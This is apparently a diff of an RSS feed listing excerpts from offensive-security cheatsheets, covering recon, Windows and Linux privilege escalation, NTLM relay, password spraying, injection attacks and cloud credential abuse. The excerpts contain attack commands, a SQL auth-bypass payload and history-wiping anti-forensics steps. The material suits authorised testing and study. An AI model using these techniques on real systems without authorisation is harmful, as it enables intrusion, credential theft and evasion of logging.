+Profile fields displayed on a &amp;ldquo;welcome, {name}&amp;rdquo; page Email templates (&amp;ldquo;Hi {firstname}&amp;rdquo;) Error pages echoing user input Search results that personalize the page Generated PDF reports (often Jinja2 / wkhtmltopdf) Wiki / CMS preview features Notification messages Admin-configurable templates exposed via UI Signal that you&amp;rsquo;re dealing with templating, not just reflection:</description></item><item><title>Recon (external)</title><link>https://jinpwn.dev/cheatsheets/misc/recon-external/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/misc/recon-external/</guid><description>External attack surface discovery. Domain in scope, find what is exposed. For internal host enum use 01 Recon &amp;amp; Enum .
 DOMAIN=target.com WL=/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt RESOLVERS=/usr/share/wordlists/resolvers.txt Build a fresh resolver list, dead resolvers wreck mass brute-force speed:
 curl -sL https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -o &amp;#34;$RESOLVERS&amp;#34; i. Subdomain enum, passive first # Passive uses cert logs and public datasets, no traffic to target:
-subfinder -d &amp;#34;$DOMAIN&amp;#34; -all -silent -o subs-passive.txt assetfinder --subs-only &amp;#34;$DOMAIN&amp;#34; | tee -a subs-passive.txt amass enum -passive -d &amp;#34;$DOMAIN&amp;#34; -o subs-amass.txt crt.sh, fast and free, one curl:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - DLL &amp; Unquoted Paths</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/</guid>
-      <description>Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.
+subfinder -d &amp;#34;$DOMAIN&amp;#34; -all -silent -o subs-passive.txt assetfinder --subs-only &amp;#34;$DOMAIN&amp;#34; | tee -a subs-passive.txt amass enum -passive -d &amp;#34;$DOMAIN&amp;#34; -o subs-amass.txt crt.sh, fast and free, one curl:</description></item><item><title>PrivEsc - DLL &amp; Unquoted Paths</title><link>https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/</guid><description>Two related Windows-specific privesc surfaces. Both abuse how Windows resolves paths and loads libraries.
 i. Unquoted service paths # When a service path has spaces and no quotes, Windows tries every prefix as the executable. If you can write to one of those prefixes, you win.
 Example service path: C:\Program Files\Common Files\My App\backup.exe
 Windows tries in order:
-C:\Program.exe C:\Program Files\Common.exe C:\Program Files\Common Files\My.exe C:\Program Files\Common Files\My App\backup.exe If you can write to any of those prefixes, drop your payload there.
-</description>
-    </item>
-    <item>
-      <title>Local Enum</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/05-local-enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/05-local-enum/</guid>
-      <description>First moves after foothold. Manual triage in the first 60 seconds, then automated tools. Privesc-specific surface lives in 06-11.
+C:\Program.exe C:\Program Files\Common.exe C:\Program Files\Common Files\My.exe C:\Program Files\Common Files\My App\backup.exe If you can write to any of those prefixes, drop your payload there.</description></item><item><title>Local Enum</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/05-local-enum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/05-local-enum/</guid><description>First moves after foothold. Manual triage in the first 60 seconds, then automated tools. Privesc-specific surface lives in 06-11.
 i. The first 60 seconds # Type these one after the other, scan the output:
-id whoami hostname uname -a cat /etc/os-release cat /etc/issue sudo -n -l ## NOPASSWD check, fails silently if password needed sudo -l 2&amp;gt;/dev/null ## what can I run as sudo What to do with the output:
-</description>
-    </item>
-    <item>
-      <title>LLMNR &amp; NTLM Relay</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/</guid>
-      <description>Capture NTLM hashes from broadcast poisoning, or relay them straight into LDAP/SMB/HTTP for instant compromise. Often the path from zero creds to domain admin.
-DC=10.10.11.50 DOMAIN=corp.local ATTACKER=10.10.14.1 i. Quick map of the chain # Capture or coerce an NTLM auth from a victim Relay that auth to a target service (LDAP, LDAPS, SMB, HTTP cert enroll, MSSQL) Action: dump SAM, write ACL, request a cert, add RBCD, get a TGT What&amp;rsquo;s relayable depends on:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Services &amp; Registry</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/</guid>
-      <description>Services run as SYSTEM by default. If you can change what a service runs, you become SYSTEM. Registry is the same surface from a different angle.
+id whoami hostname uname -a cat /etc/os-release cat /etc/issue sudo -n -l ## NOPASSWD check, fails silently if password needed sudo -l 2&amp;gt;/dev/null ## what can I run as sudo What to do with the output:</description></item><item><title>LLMNR &amp; NTLM Relay</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/</guid><description>Capture NTLM hashes from broadcast poisoning, or relay them straight into LDAP/SMB/HTTP for instant compromise. Often the path from zero creds to domain admin.
+DC=10.10.11.50 DOMAIN=corp.local ATTACKER=10.10.14.1 i. Quick map of the chain # Capture or coerce an NTLM auth from a victim Relay that auth to a target service (LDAP, LDAPS, SMB, HTTP cert enroll, MSSQL) Action: dump SAM, write ACL, request a cert, add RBCD, get a TGT What&amp;rsquo;s relayable depends on:</description></item><item><title>PrivEsc - Services &amp; Registry</title><link>https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/</guid><description>Services run as SYSTEM by default. If you can change what a service runs, you become SYSTEM. Registry is the same surface from a different angle.
 i. Enumerate writable service surfaces # Full service list with paths and start mode:
 Get-CimInstance Win32_Service | Select-Object Name,DisplayName,StartName,StartMode,State,PathName The four ways to hijack a service:
-Service binary writable -&amp;gt; overwrite the EXE Service binary directory writable -&amp;gt; drop a DLL it loads Service registry key writable -&amp;gt; change ImagePath Service config writable via SCM -&amp;gt; sc.exe config Check all four with PowerUp / PrivescCheck in one go:
-</description>
-    </item>
-    <item>
-      <title>Pivoting</title>
-      <link>https://jinpwn.dev/cheatsheets/misc/pivoting/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/misc/pivoting/</guid>
-      <description>Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.
-LHOST=10.10.14.1 ## attacker PIVOT=10.10.11.50 ## compromised host INTERNAL=172.16.5.0/24 ## target segment i. Quick decision # SSH on the pivot, you have creds, only SSH allowed out -&amp;gt; ii. SSH tunnels Arbitrary TCP allowed out, you control both ends -&amp;gt; iii. Chisel Need full L3 access (ICMP, UDP, scanning works as if local) -&amp;gt; iv. Ligolo-ng Only HTTPS allowed outbound -&amp;gt; vi. Tunnel over HTTPS Pivot is Windows, no extra binaries allowed -&amp;gt; netsh portproxy + SSH ii. SSH tunnels # Local forward, expose a remote port on your loopback:
-</description>
-    </item>
-    <item>
-      <title>Password Spraying</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/</guid>
-      <description>One password, many users. Stay under lockout. Get creds.
+Service binary writable -&amp;gt; overwrite the EXE Service binary directory writable -&amp;gt; drop a DLL it loads Service registry key writable -&amp;gt; change ImagePath Service config writable via SCM -&amp;gt; sc.exe config Check all four with PowerUp / PrivescCheck in one go:</description></item><item><title>Pivoting</title><link>https://jinpwn.dev/cheatsheets/misc/pivoting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/misc/pivoting/</guid><description>Reach the next network segment from your foothold. Pick the tool by what the target allows outbound.
+LHOST=10.10.14.1 ## attacker PIVOT=10.10.11.50 ## compromised host INTERNAL=172.16.5.0/24 ## target segment i. Quick decision # SSH on the pivot, you have creds, only SSH allowed out -&amp;gt; ii. SSH tunnels Arbitrary TCP allowed out, you control both ends -&amp;gt; iii. Chisel Need full L3 access (ICMP, UDP, scanning works as if local) -&amp;gt; iv. Ligolo-ng Only HTTPS allowed outbound -&amp;gt; vi. Tunnel over HTTPS Pivot is Windows, no extra binaries allowed -&amp;gt; netsh portproxy + SSH ii. SSH tunnels # Local forward, expose a remote port on your loopback:</description></item><item><title>Password Spraying</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad05-password-spraying/</guid><description>One password, many users. Stay under lockout. Get creds.
 DC=10.10.11.50 DOMAIN=corp.local i. Lockout policy FIRST # Spray without checking lockout = locked accounts = client incident. Always read the policy.
 bloodyAD (read directly from domain object):
 bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get object &amp;#34;DC=corp,DC=local&amp;#34; \ --attr minPwdLength,lockoutThreshold,lockOutObservationWindow,lockoutDuration,maxPwdAge,minPwdAge Output keys to read:
-lockoutThreshold - failed attempts before lockout (0 = no lockout, the dream) lockOutObservationWindow - time window for counting failures (negative number, divide by -600,000,000 for minutes) lockoutDuration - how long the account stays locked minPwdLength - informs password choices nxc shortcut:
-</description>
-    </item>
-    <item>
-      <title>Initial Access</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/04-initial-access/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/04-initial-access/</guid>
-      <description>Foothold patterns on Linux. Comes after 02 Service Enum gave you a target service. For the shell mechanics, see Reverse Shells .
+lockoutThreshold - failed attempts before lockout (0 = no lockout, the dream) lockOutObservationWindow - time window for counting failures (negative number, divide by -600,000,000 for minutes) lockoutDuration - how long the account stays locked minPwdLength - informs password choices nxc shortcut:</description></item><item><title>Initial Access</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/04-initial-access/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/04-initial-access/</guid><description>Foothold patterns on Linux. Comes after 02 Service Enum gave you a target service. For the shell mechanics, see Reverse Shells .
 i. SSH # Weak password, online spray:
 hydra -L users.txt -P passwords.txt ssh://&amp;#34;$T&amp;#34; -t 4 -f nxc ssh &amp;#34;$T&amp;#34; -u users.txt -p passwords.txt Stolen / leaked private key from web, git, exposed backup:
-chmod 600 id_rsa ssh -i id_rsa user@&amp;#34;$T&amp;#34; ## Encrypted key, crack it first: ssh2john id_rsa &amp;gt; k.hash hashcat -m 22921 k.hash &amp;#34;$WL&amp;#34; Known username + no password set (very common on CTF and badly configured boxes):
-</description>
-    </item>
-    <item>
-      <title>Command Injection</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web05-command-injection/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web05-command-injection/</guid>
-      <description>User input ends up in a shell command. The fastest path from web bug to shell.
+chmod 600 id_rsa ssh -i id_rsa user@&amp;#34;$T&amp;#34; ## Encrypted key, crack it first: ssh2john id_rsa &amp;gt; k.hash hashcat -m 22921 k.hash &amp;#34;$WL&amp;#34; Known username + no password set (very common on CTF and badly configured boxes):</description></item><item><title>Command Injection</title><link>https://jinpwn.dev/cheatsheets/web/web05-command-injection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web05-command-injection/</guid><description>User input ends up in a shell command. The fastest path from web bug to shell.
 T=https://target.com i. Where it lives # Endpoints that obviously call OS commands:
-Ping / traceroute / nslookup / whois tools Image conversion (ImageMagick, Ghostscript, libreoffice, ffmpeg) PDF generation (wkhtmltopdf, pdfkit, weasyprint, headless Chrome) File rename, archive extract (tar, unzip, 7z) Backup / export / &amp;ldquo;send report&amp;rdquo; features Network diagnostics (any &amp;ldquo;test connectivity&amp;rdquo;) Log viewers calling grep / tail on disk Less obvious:
-</description>
-    </item>
-    <item>
-      <title>Shell &amp; Tooling</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/03-shell--tooling/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/03-shell--tooling/</guid>
-      <description>What to do after you have a shell on the target. For getting the shell in the first place, see Reverse Shells and 04 Initial Access .
+Ping / traceroute / nslookup / whois tools Image conversion (ImageMagick, Ghostscript, libreoffice, ffmpeg) PDF generation (wkhtmltopdf, pdfkit, weasyprint, headless Chrome) File rename, archive extract (tar, unzip, 7z) Backup / export / &amp;ldquo;send report&amp;rdquo; features Network diagnostics (any &amp;ldquo;test connectivity&amp;rdquo;) Log viewers calling grep / tail on disk Less obvious:</description></item><item><title>Shell &amp; Tooling</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/03-shell--tooling/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/03-shell--tooling/</guid><description>What to do after you have a shell on the target. For getting the shell in the first place, see Reverse Shells and 04 Initial Access .
 i. Silence the shell # Disable history, locale, less and friends, before doing anything noisy:
 unset HISTFILE export HISTFILE=/dev/null export HISTSIZE=0 export LESSHISTFILE=/dev/null export MYSQL_HISTFILE=/dev/null export PYTHONHISTFILE=/dev/null export REDISCLI_HISTFILE=/dev/null Leading-space trick, any command starting with a space is not logged (bash with HISTCONTROL=ignorespace):
-id ## leading space, not in history Wipe existing user history before logout:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Tokens &amp; Privileges</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/</guid>
-      <description>Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum .
-i. The privilege table # whoami /priv Privilege What it gives Path SeImpersonatePrivilege Impersonate another token Potato attack SeAssignPrimaryTokenPrivilege Assign primary token Potato attack SeBackupPrivilege Read any file Dump SAM/SYSTEM SeRestorePrivilege Write any file Replace utilman or service binary SeDebugPrivilege Open any process Dump LSASS SeTakeOwnershipPrivilege Take ownership of any file Own then write SeLoadDriverPrivilege Load kernel drivers Capcom driver trick SeManageVolumePrivilege Manage volumes Indirect file write SeTcbPrivilege Act as part of OS Already SYSTEM-equivalent SeCreateTokenPrivilege Create arbitrary tokens Rare, direct SYSTEM Disabled privileges still count, you just need to enable them first (most tools handle this automatically).
-</description>
-    </item>
-    <item>
-      <title>Password Cracking</title>
-      <link>https://jinpwn.dev/cheatsheets/misc/password-cracking/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/misc/password-cracking/</guid>
-      <description>Offline hash cracking. Online brute force is in 02 Service Enum under each service.
+id ## leading space, not in history Wipe existing user history before logout:</description></item><item><title>PrivEsc - Tokens &amp; Privileges</title><link>https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/</guid><description>Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum .
+i. The privilege table # whoami /priv Privilege What it gives Path SeImpersonatePrivilege Impersonate another token Potato attack SeAssignPrimaryTokenPrivilege Assign primary token Potato attack SeBackupPrivilege Read any file Dump SAM/SYSTEM SeRestorePrivilege Write any file Replace utilman or service binary SeDebugPrivilege Open any process Dump LSASS SeTakeOwnershipPrivilege Take ownership of any file Own then write SeLoadDriverPrivilege Load kernel drivers Capcom driver trick SeManageVolumePrivilege Manage volumes Indirect file write SeTcbPrivilege Act as part of OS Already SYSTEM-equivalent SeCreateTokenPrivilege Create arbitrary tokens Rare, direct SYSTEM Disabled privileges still count, you just need to enable them first (most tools handle this automatically).</description></item><item><title>Password Cracking</title><link>https://jinpwn.dev/cheatsheets/misc/password-cracking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/misc/password-cracking/</guid><description>Offline hash cracking. Online brute force is in 02 Service Enum under each service.
 WL=/usr/share/wordlists/rockyou.txt RULES=/usr/share/hashcat/rules/best64.rule i. Identify the hash first # hashid &amp;#39;hash-here&amp;#39; hash-identifier nth hash-here ## name-that-hash, most accurate Common modes you will hit on every box:
-Hash hashcat -m Notes MD5 0 almost never alone, often wrapped SHA1 100 same NTLM 1000 local Windows accounts, from SAM NetNTLMv2 5600 from responder / smb relay Kerberos TGS (kerberoast) 13100 $krb5tgs$23$* Kerberos AS-REP 18200 $krb5asrep$23$ MD5crypt 500 $1$ Linux shadow sha256crypt 7400 $5$ sha512crypt 1800 $6$ Linux shadow, SLOW bcrypt 3200 $2a$, $2b$, SLOW MSSQL 2012+ 1731 0x0200... WPA-PBKDF2 22000 new format, replaces 2500 LUKS 14600 also 29541 for LUKS2 7-Zip 11600 $7z$ KeePass 13400 use keepass2john first ii. Hashcat basics # Dictionary attack:
-</description>
-    </item>
-    <item>
-      <title>NoSQL Injection</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/</guid>
-      <description>MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.
+Hash hashcat -m Notes MD5 0 almost never alone, often wrapped SHA1 100 same NTLM 1000 local Windows accounts, from SAM NetNTLMv2 5600 from responder / smb relay Kerberos TGS (kerberoast) 13100 $krb5tgs$23$* Kerberos AS-REP 18200 $krb5asrep$23$ MD5crypt 500 $1$ Linux shadow sha256crypt 7400 $5$ sha512crypt 1800 $6$ Linux shadow, SLOW bcrypt 3200 $2a$, $2b$, SLOW MSSQL 2012+ 1731 0x0200... WPA-PBKDF2 22000 new format, replaces 2500 LUKS 14600 also 29541 for LUKS2 7-Zip 11600 $7z$ KeePass 13400 use keepass2john first ii. Hashcat basics # Dictionary attack:</description></item><item><title>NoSQL Injection</title><link>https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web04-nosql-injection/</guid><description>MongoDB, CouchDB, Redis, Elastic, Cassandra. Different syntax, same idea: untrusted input ends up in a query.
 T=https://target.com i. Where it lives # Most common in Node.js / Python apps using MongoDB. Look for:
-Login forms with JSON body (MongoDB find with raw user input) Search endpoints that accept structured queries API endpoints with JSON parameters (/api/users?filter={...}) Redis-backed sessions / cache (rare to inject, but possible) Elasticsearch query strings CouchDB Mango queries Signal that suggests NoSQL behind the scenes:
-</description>
-    </item>
-    <item>
-      <title>GCP</title>
-      <link>https://jinpwn.dev/cheatsheets/cloud/gcp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/cloud/gcp/</guid>
-      <description>Google Cloud Platform attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside a GCP project.
+Login forms with JSON body (MongoDB find with raw user input) Search endpoints that accept structured queries API endpoints with JSON parameters (/api/users?filter={...}) Redis-backed sessions / cache (rare to inject, but possible) Elasticsearch query strings CouchDB Mango queries Signal that suggests NoSQL behind the scenes:</description></item><item><title>GCP</title><link>https://jinpwn.dev/cheatsheets/cloud/gcp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/cloud/gcp/</guid><description>Google Cloud Platform attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside a GCP project.
 PROJECT=target-prod SA=svc-account@target-prod.iam.gserviceaccount.com i. Authentication options # Service Account key file (most common foothold) # JSON key file (-----BEGIN PRIVATE KEY----- inside):
-gcloud auth activate-service-account --key-file=key.json gcloud auth list ## confirm active identity gcloud config set project $PROJECT Application Default Credentials (ADC) # gcloud auth application-default login ## ADC stored in: ~/.config/gcloud/application_default_credentials.json Access token directly # ## Get a token for an active identity: TOKEN=$(gcloud auth print-access-token) ## Use it directly: curl -H &amp;#34;Authorization: Bearer $TOKEN&amp;#34; &amp;#34;https://cloudresourcemanager.googleapis.com/v1/projects&amp;#34; Personal user auth (interactive) # gcloud auth login gcloud auth login --no-launch-browser ## for headless / SSH ii. Metadata service inside Compute Engine # When you have RCE or SSRF on a Compute Engine instance, hit the metadata service. GCP requires the Metadata-Flavor: Google header - missing it returns 403.
-</description>
-    </item>
-    <item>
-      <title>Azure</title>
-      <link>https://jinpwn.dev/cheatsheets/cloud/azure/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/cloud/azure/</guid>
-      <description>Azure + Entra ID (formerly Azure AD) attack surface. Hybrid AD integration covered briefly here, full on-prem AD in 00 AD MOC .
+gcloud auth activate-service-account --key-file=key.json gcloud auth list ## confirm active identity gcloud config set project $PROJECT Application Default Credentials (ADC) # gcloud auth application-default login ## ADC stored in: ~/.config/gcloud/application_default_credentials.json Access token directly # ## Get a token for an active identity: TOKEN=$(gcloud auth print-access-token) ## Use it directly: curl -H &amp;#34;Authorization: Bearer $TOKEN&amp;#34; &amp;#34;https://cloudresourcemanager.googleapis.com/v1/projects&amp;#34; Personal user auth (interactive) # gcloud auth login gcloud auth login --no-launch-browser ## for headless / SSH ii. Metadata service inside Compute Engine # When you have RCE or SSRF on a Compute Engine instance, hit the metadata service. GCP requires the Metadata-Flavor: Google header - missing it returns 403.</description></item><item><title>Azure</title><link>https://jinpwn.dev/cheatsheets/cloud/azure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/cloud/azure/</guid><description>Azure + Entra ID (formerly Azure AD) attack surface. Hybrid AD integration covered briefly here, full on-prem AD in 00 AD MOC .
 Naming Microsoft rebranded &amp;ldquo;Azure AD&amp;rdquo; to &amp;ldquo;Entra ID&amp;rdquo; in 2023. Same product, same APIs. Tools still use &amp;ldquo;AAD&amp;rdquo; interchangeably. This file uses &amp;ldquo;Entra ID&amp;rdquo; for the identity layer and &amp;ldquo;Azure&amp;rdquo; for the resource layer.
-TENANT=target.onmicrosoft.com USER=&amp;#39;user@target.com&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Pre-auth: tenant enumeration # You don&amp;rsquo;t need credentials to enumerate a tenant&amp;rsquo;s basic info. Public endpoints give you a lot.
-</description>
-    </item>
-    <item>
-      <title>AS-REP Roasting</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/</guid>
-      <description>Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline.
+TENANT=target.onmicrosoft.com USER=&amp;#39;user@target.com&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Pre-auth: tenant enumeration # You don&amp;rsquo;t need credentials to enumerate a tenant&amp;rsquo;s basic info. Public endpoints give you a lot.</description></item><item><title>AS-REP Roasting</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad04-as-rep-roasting/</guid><description>Request a TGT for any user without DONT_REQ_PREAUTH set. The response is encrypted with the user&amp;rsquo;s NT key. Crack offline.
 DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Find AS-REP roastable users # UAC flag is DONT_REQ_PREAUTH (bit 4194304 / 0x400000).
 BloodHound:
 MATCH (u:User {dontreqpreauth: true, enabled: true}) RETURN u.name bloodyAD filter:
-bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get search \ --filter &amp;#39;(userAccountControl:1.2.840.113556.1.4.803:=4194304)&amp;#39; \ --attr samaccountname nxc enumerates and pulls hashes in one call (see next section).
-</description>
-    </item>
-    <item>
-      <title>SQL Injection</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web03-sql-injection/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web03-sql-injection/</guid>
-      <description>Find injection points, confirm, extract, escalate to RCE.
+bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get search \ --filter &amp;#39;(userAccountControl:1.2.840.113556.1.4.803:=4194304)&amp;#39; \ --attr samaccountname nxc enumerates and pulls hashes in one call (see next section).</description></item><item><title>SQL Injection</title><link>https://jinpwn.dev/cheatsheets/web/web03-sql-injection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web03-sql-injection/</guid><description>Find injection points, confirm, extract, escalate to RCE.
 T=https://target.com i. Where it lives # Anywhere user input ends up in a SQL query:
-URL parameters (?id=1, ?search=x) POST body fields JSON keys and values HTTP headers (User-Agent, Referer, X-Forwarded-For occasionally logged into DB) Cookies Anywhere you see numeric IDs, sort/order params, filter fields Search forms (especially with LIKE clauses) Login forms (auth bypass via &#39; OR 1=1--) Second-order points (data stored then later used in another query unsafely) ii. Quick detection # Test these on every parameter, even ones that look &amp;ldquo;non-injectable&amp;rdquo;:
-</description>
-    </item>
-    <item>
-      <title>Service Enum</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/02-service-enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/02-service-enum/</guid>
-      <description>Per-service enum after 01 Recon &amp;amp; Enum gave you open ports. Each section assumes you set $T and the port. Web (80, 443, 8080, 8443) goes to 00 Linux MOC T=10.10.11.50 i. FTP (21) # nmap -p21 -sCV --script=&amp;#34;ftp-anon,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221&amp;#34; &amp;#34;$T&amp;#34; ftp -nv &amp;#34;$T&amp;#34; &amp;lt;&amp;lt;&amp;lt;$&amp;#39;user anonymous anonymous\nls -la\nquit&amp;#39; What to check: anonymous login, writable directory, version banner (vsftpd 2.3.4 = backdoor CVE-2011-2523, ProFTPD 1.3.5 = mod_copy CVE-2015-3306).
-Bulk download if anon read works:
-</description>
-    </item>
-    <item>
-      <title>Local Enum</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w02-local-enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w02-local-enum/</guid>
-      <description>First moves after foothold on Windows. Same idea as Linux Local Enum but different commands. AD-joined hosts also need AD MOC enum.
+URL parameters (?id=1, ?search=x) POST body fields JSON keys and values HTTP headers (User-Agent, Referer, X-Forwarded-For occasionally logged into DB) Cookies Anywhere you see numeric IDs, sort/order params, filter fields Search forms (especially with LIKE clauses) Login forms (auth bypass via ' OR 1=1--) Second-order points (data stored then later used in another query unsafely) ii. Quick detection # Test these on every parameter, even ones that look &amp;ldquo;non-injectable&amp;rdquo;:</description></item><item><title>Service Enum</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/02-service-enum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/02-service-enum/</guid><description>Per-service enum after 01 Recon &amp;amp; Enum gave you open ports. Each section assumes you set $T and the port. Web (80, 443, 8080, 8443) goes to 00 Linux MOC T=10.10.11.50 i. FTP (21) # nmap -p21 -sCV --script=&amp;#34;ftp-anon,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221&amp;#34; &amp;#34;$T&amp;#34; ftp -nv &amp;#34;$T&amp;#34; &amp;lt;&amp;lt;&amp;lt;$&amp;#39;user anonymous anonymous\nls -la\nquit&amp;#39; What to check: anonymous login, writable directory, version banner (vsftpd 2.3.4 = backdoor CVE-2011-2523, ProFTPD 1.3.5 = mod_copy CVE-2015-3306).
